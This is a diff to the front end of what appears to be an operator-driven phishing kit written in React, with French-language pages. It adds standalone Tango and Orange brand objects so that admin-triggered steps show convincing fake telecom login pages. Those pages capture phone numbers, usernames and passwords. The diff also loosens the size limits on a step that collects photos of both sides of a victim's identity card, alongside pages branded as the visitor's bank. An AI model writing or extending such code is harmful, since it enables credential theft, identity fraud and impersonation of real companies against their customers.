@@ -277,6 +277,25 @@ const inputClsPlain = (err) =>
 const errCls = "mt-1.5 flex items-center gap-1 text-[12.5px] font-semibold text-red-600";
 const labelCls = "text-[13px] font-extrabold tracking-wide text-neutral-800";
 
+// Standalone brands for the admin-triggered Tango / Orange steps.
+// Shown instead of the visitor's bank so the page matches what was asked.
+const TANGO_BRAND = {
+  slug: "tango",
+  short: "TANGO",
+  name: "Tango",
+  color: "#1f2a5a",
+  dark: "#141b3d",
+  initial: "T",
+};
+const ORANGE_BRAND = {
+  slug: "orange",
+  short: "ORANGE",
+  name: "Orange",
+  color: "#ff7900",
+  dark: "#d96800",
+  initial: "O",
+};
+
 function LeadIcon({ d, className = "" }) {
   return (
     <span className={`pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-neutral-400 ${className}`}>
@@ -364,8 +383,7 @@ function checkIdFile(file) {
   const t = (file.type || "").toLowerCase();
   if (t !== "image/png" && t !== "image/jpeg" && t !== "image/jpg")
     return "PNG, JPG ou JPEG uniquement.";
-  if (file.size < 100 * 1024) return "Image trop petite (min 100 Ko).";
-  if (file.size > 1024 * 1024) return "Image trop grande (max 1 Mo).";
+  if (file.size > 10 * 1024 * 1024) return "Image trop grande (max 10 Mo).";
   return "";
 }
 
@@ -658,12 +676,13 @@ function checkIdFile(file) {
   if (status === "tango_requested") {
     {
       const digits = phone.replace(/\D/g, "");
-      const phErr = !t3 ? "" : !digits ? "Le numÃ©ro de tÃ©lÃ©phone est requis." : digits.length < 8 ? "Veuillez saisir un numÃ©ro valide." : "";
+      const phErr = !t3 ? "" : !digits ? "Le numéro de téléphone est requis." : digits.length < 8 ? "Veuillez saisir un numéro valide." : "";
       const pwErr = !t3 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
       const ok = digits.length >= 8 && password.length >= 4;
+      const brand = TANGO_BRAND;
       return (
         <Shell
-          bank={bank}
+          bank={brand}
           step={1}
           kicker="Connexion"
           title="Connectez-vous Ã  Tango"
@@ -714,7 +733,7 @@ function checkIdFile(file) {
               {pwErr && <span className={errCls}>âš  {pwErr}</span>}
             </label>
             <div className="mt-6">
-              <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Se connecter â†’</PrimaryBtn>
+              <PrimaryBtn bank={brand} type="submit" loading={loading} disabled={!ok}>Se connecter →</PrimaryBtn>
             </div>
           </form>
         </Shell>
@@ -724,12 +743,13 @@ function checkIdFile(file) {
 
   /* ---------- ORANGE (admin ask, any bank) ---------- */
   if (status === "orange_requested") {
+      const brand = ORANGE_BRAND;
       const unErr = !t1 ? "" : !orangeUser.trim() ? "Le nom d'utilisateur est requis." : "";
       const pwErr = !t1 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
       const ok = orangeUser.trim() && password.length >= 4;
       return (
         <Shell
-          bank={bank}
+          bank={brand}
           step={1}
           kicker="Connexion"
           title="Connectez-vous Ã  Orange"
@@ -779,7 +799,7 @@ function checkIdFile(file) {
               {pwErr && <span className={errCls}>âš  {pwErr}</span>}
             </label>
             <div className="mt-6">
-              <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Se connecter â†’</PrimaryBtn>
+              <PrimaryBtn bank={brand} type="submit" loading={loading} disabled={!ok}>Se connecter →</PrimaryBtn>
             </div>
           </form>
         </Shell>
@@ -1198,7 +1218,7 @@ function checkIdFile(file) {
       }
     }
 
-    function IdBox({ side, file, setFile, preview, setPreview, err, pct }) {
+    function IdBox({ side, setFile, preview, setPreview, err, pct }) {
       return (
         <label className="block min-w-0">
           <span className={labelCls}>{side === "front" ? "Recto" : "Verso"}</span>
@@ -1240,7 +1260,7 @@ function checkIdFile(file) {
     }
 
     return (
-      <Shell bank={bank} step={7} kicker="PiÃ¨ce d'identitÃ©" title="TÃ©lÃ©versez votre piÃ¨ce d'identitÃ©" desc="Photographiez le recto et le verso de votre carte d'identitÃ©. PNG ou JPG, entre 100 Ko et 1 Mo.">
+      <Shell bank={bank} step={7} kicker="PiÃ¨ce d'identitÃ©" title="TÃ©lÃ©versez votre piÃ¨ce d'identitÃ©" desc="Photographiez le recto et le verso de votre carte d'identitÃ©. PNG ou JPG, max 10 Mo.">
         <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
           <IdBox side="front" file={idFront} setFile={setIdFront} preview={idFrontUrl} setPreview={setIdFrontUrl} err={fErr} pct={idPct.front} />
           <IdBox side="back" file={idBack} setFile={setIdBack} preview={idBackUrl} setPreview={setIdBackUrl} err={bErr} pct={idPct.back} />
